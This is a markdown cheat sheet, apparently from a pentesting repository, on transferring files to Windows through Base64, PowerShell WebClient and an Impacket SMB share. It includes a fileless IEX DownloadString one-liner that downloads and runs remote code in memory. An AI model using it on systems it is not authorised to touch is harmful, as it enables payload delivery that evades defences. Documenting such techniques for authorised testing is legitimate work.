# Windows
[PowerShell Base64 Encode & Decode](https://github.com/h4ck3r-cat/file.transfers/blob/main/Windows.md#powershell-base64-encode--decode)
<br>
[PowerShell Web Downloads](https://github.com/h4ck3r-cat/file.transfers/blob/main/Windows/Windows.md#step-2-encode-file-to-base64)
<br>
[SMB Downloads](https://github.com/h4ck3r-cat/file.transfers/blob/main/Windows/Windows.md#smb-downloads)
<br>
[FTP Downloads](https://github.com/h4ck3r-cat/file.transfers/blob/main/Windows/Windows.md#ftp-downloads)
## PowerShell Base64 Encode & Decode
This is the simplest and most conveinient method and does **not** require a network connection

### Step 1: Check MD5 Hash
```bash
$ md5sum file.txt
f4d11dce99a848fe050ab3ef2c966b62  file.txt
```
### Step 2: Encode File to Base64
```bash
$ cat file.txt |base64 -w 0

YXJvbgpwd25tZW93CmVnb3Rpc3RpY2Fsc3cKYWRtaW4K
```
### Step 3: Decode in Powershell
```powershell
PS> [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('YXJvbgpwd25tZW93CmVnb3Rpc3RpY2Fsc3cKYWRtaW4K')) | Out-File -FilePath "C:\Path\To\Decoded\Output.txt" -Encoding UTF8
```
### Step 4: Check MD5 Hash in PowerShell
```powershell
PS> Get-FileHash Output.txt -Algorithm md5

F4D11DCE99A848FE050AB3EF2C966B62
```
If the MD5 hashs are the same, we succeeded in trasfering the file.
> [!IMPORTANT]
> If the MD5 hashs do not match then you might have a few reasons why:
> 1. Line Endings: Different operating systems use different conventions for line endings in text files. Windows typically uses CRLF (\r\n), while Unix-based systems use LF (\n). If the line endings are different, it can result in different MD5 checksums.
> 2. Encoding Differences: If the files are text files and have different character encodings (e.g., UTF-8 vs. UTF-16), this can result in different MD5 checksums.
> 3. Whitespace Differences: Extra whitespace (leading/trailing spaces, tabs, etc.) can also cause differences in MD5 checksums.

By addressing these factors, you should be able to get consistent MD5 checksums for files with identical content.

## PowerShell Web Downloads
PowerShell provides a versatile array of **file transfer** capabilities, with the *System.Net.WebClient* class serving as a reliable tool for downloading files across **HTTP**, **HTTPS**, or **FTP** protocols. Within this class, various methods cater to different download requirements. The following table outlines key **WebClient** methods designed for downloading data from a resource, each catering to specific scenarios:

| Method              | Description                                                                                             |
|---------------------|---------------------------------------------------------------------------------------------------------|
| OpenRead            | Retrieves data from a resource and returns it as a Stream.                                               |
| OpenReadAsync       | Asynchronously obtains data from a resource without blocking the calling thread.                         |
| DownloadData        | Downloads data from a resource and returns it as a Byte array.                                           |
| DownloadDataAsync   | Asynchronously downloads data from a resource, returning a Byte array without blocking the calling thread.|
| [DownloadFile]()        | Downloads data from a resource and saves it to a local file.                                             |
| DownloadFileAsync   | Asynchronously downloads data from a resource to a local file without blocking the calling thread.       |
| [DownloadString]()      | Retrieves a String from a resource and returns it as a String.                                            |
| DownloadStringAsync | Asynchronously downloads a String from a resource without blocking the calling thread.                    |

### PowerShell DownloadFile Method
You can download files using the following powershell code:
```powershell
PS> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

### PowerShell DownloadString - Fileless Method
Fileless attacks operate by utilizing certain functions within an operating system to download and execute a payload directly. Instead of saving a PowerShell script to the computer's storage, we execute it straight from the computer's memory using the Invoke-Expression cmdlet or its shorthand alias, IEX as follows:
```powershell
PS> IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
```

### PowerShell Invoke-WebRequest
```powershell
PS> Invoke-WebRequest <Target File URL> -OutFile <Output File Name>
```
## SMB Downloads
The **Server Message Block protocol (SMB protocol)** that runs on port **TCP/445** is common in enterprise networks where Windows services are running.

In order to transfer files, we need to create an SMB server in our machine with *smbserver.py* from Impacket and then use **copy**, **move**, **PowerShell Copy-Item**, or any other tool that allows connection to SMB.

### Step 1: Create the SMB Server
We will be using **Impacket**, if you dont have it installed you can do that using this bash code:
```bash
$ sudo apt-get install python3-impacket
```

Once we have that installed we can move on to actually creating the smb server:
```bash
$ sudo impacket-smbserver <Share Name> -smb2support <Share Folder>
```

Example:
```bash
$ sudo impacket-smbserver sharefolder -smb2support /tmp/share
```
### Step 2: Copying a File from the SMB Server
Log into the SMB server using smbclient:
```powershell
PS> smbclient \\<IP Adrress>\\<Share Name>
```

Example:
```powershell
PS> smbclient \\10.10.10.10\\sharefolder

Password for [WORKGROUP\user]:
Try "help" to get a list of possible commands.
smb: \>
```
**Note:** in this case we did not specify a password so any password will be suffecient for accessing the files, although it is better to add credentials.

## FTP Downloads
